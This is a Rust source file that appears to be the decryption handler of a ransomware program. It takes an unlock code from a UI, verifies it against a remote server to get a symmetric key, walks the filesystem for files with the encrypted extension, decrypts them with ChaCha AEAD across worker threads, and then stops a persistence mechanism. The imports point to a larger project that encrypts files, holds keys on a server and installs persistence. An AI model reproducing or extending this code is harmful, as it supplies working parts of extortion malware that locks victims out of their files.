use flume::Receiver;
use log::{debug, error, info};
use slint::ComponentHandle;
use std::{
    path::PathBuf,
    sync::{Arc, mpsc},
    thread,
};
use zeroize::{Zeroize, Zeroizing};

use crate::{
    Main,
    client::{channel_capacity, recv_path},
    comm::{ServerConn, get_sym_key},
    config,
    crypto::{aead_decrypt_file, parse_encrypted_file_name},
    persist::stop_persist,
    status::Status,
    walker::walk_with_exts,
};

pub struct DecryptConfig {
    pub status: Status,
    pub conn: ServerConn,
    pub preshared_secret: String,
    pub encrypted_extension: Arc<str>,
    pub walk_threads: usize,
    pub decrypt_threads: usize,
    pub persist: bool,
}

fn set_ui_status(ui: &slint::Weak<Main>, text: &str, progress: Option<bool>) {
    let text = text.to_string();
    let result = ui.upgrade_in_event_loop(move |handle| {
        handle.set_status_text(text.into());
        if let Some(progress) = progress {
            handle.set_status_progress(progress);
        }
    });
    if result.is_err() {
        error!("Failed to upgrade UI handle");
    }
}

pub fn spawn_decryption_handler(ui: &Main, config: DecryptConfig) -> mpsc::SyncSender<String> {
    let ui_handle = ui.as_weak();
    let (decrypt_tx, decrypt_rx) = mpsc::sync_channel(1);

    thread_scope(config, ui_handle, decrypt_rx);

    decrypt_tx
}

fn thread_scope(
    config: DecryptConfig,
    ui_handle: slint::Weak<Main>,
    decrypt_rx: mpsc::Receiver<String>,
) {
    thread::spawn(move || {
        let mut persistence_stopped = false;
        loop {
            let Ok(code): Result<String, _> = decrypt_rx.recv() else {
                debug!("Decryption channel closed; handler exiting");
                return;
            };

            let Ok(sym_key) = get_sym_key(
                &config.conn,
                &config.status,
                &code,
                &config.preshared_secret,
            ) else {
                set_ui_status(&ui_handle, "Code failed verification", Some(false));
                continue;
            };

            info!("Starting decryption");
            set_ui_status(
                &ui_handle,
                "Code successfully verified. Decrypting...",
                None,
            );

            let aad: Arc<[u8]> = Arc::from(config.status.encryption_aad.as_bytes());
            decrypt_files(
                sym_key,
                &config.encrypted_extension,
                config.walk_threads,
                config.decrypt_threads,
                &aad,
            );

            info!("Decryption complete");
            set_ui_status(&ui_handle, "Decryption complete", Some(false));

            if config.persist && !persistence_stopped {
                persistence_stopped = true;
                if let Err(error) = stop_persist() {
                    error!("Failed to end persistence: {error}");
                }
            }
        }
    });
}

fn decrypt_files(
    sym_key: Zeroizing<[u8; 32]>,
    encrypted_extension: &Arc<str>,
    walk_threads: usize,
    decrypt_threads: usize,
    aad: &Arc<[u8]>,
) {
    let (dec_walk_tx, dec_walk_rx) = flume::bounded(channel_capacity(decrypt_threads));
    let mut thread_handles = Vec::new();

    let exts = [encrypted_extension.to_string()];
    thread_handles.push(walk_with_exts(
        dec_walk_tx.clone(),
        Some(exts.as_slice()),
        None,
        walk_threads,
    ));
    drop(dec_walk_tx);

    let sym_key_arc = Arc::new(sym_key);
    for _ in 0..decrypt_threads {
        thread_handles.push(decrypt_worker(
            dec_walk_rx.clone(),
            Arc::clone(&sym_key_arc),
            Arc::clone(aad),
            Arc::clone(encrypted_extension),
        ));
    }
    drop(dec_walk_rx);

    for handle in thread_handles {
        handle.join().expect("Thread panicked");
    }

    if let Ok(mut key) = Arc::try_unwrap(sym_key_arc) {
        key.zeroize();
    } else {
        error!("Failed to clear decryption key: outstanding references");
    }
}

fn decrypt_worker(
    receiver: Receiver<Arc<PathBuf>>,
    key: Arc<Zeroizing<[u8; 32]>>,
    aad: Arc<[u8]>,
    expected_ext: Arc<str>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        loop {
            let Some(file_path) = recv_path(&receiver) else {
                return;
            };

            info!("Decrypting file: {}", file_path.display());

            let Some(file_name_osstr) = file_path.file_name() else {
                error!("File path has invalid file name: {file_path:?}");
                continue;
            };
            let Some(file_name) = file_name_osstr.to_str() else {
                error!(
                    "File name is not valid UTF-8: {}",
                    file_name_osstr.display()
                );
                continue;
            };

            let Some((decrypted_file_name, full_nonce_bytes)) =
                parse_encrypted_file_name(file_name, &expected_ext)
            else {
                error!("File name does not match encrypted shape: {file_name}");
                continue;
            };

            let Some(parent_dir) = file_path.parent() else {
                error!("File path has invalid parent path: {file_path:?}");
                continue;
            };
            let decrypted_file_path = parent_dir.join(decrypted_file_name);

            match aead_decrypt_file(
                file_path.as_ref(),
                &decrypted_file_path,
                &key,
                &full_nonce_bytes,
                &aad,
                config::MAX_ENCRYPT_FILE_BYTES,
            ) {
                Ok(()) => {
                    debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
                }
                Err(error) => {
                    error!("Failed to apply ChaCha to data for decryption: {error:?}");
                }
            }
        }
    })
}
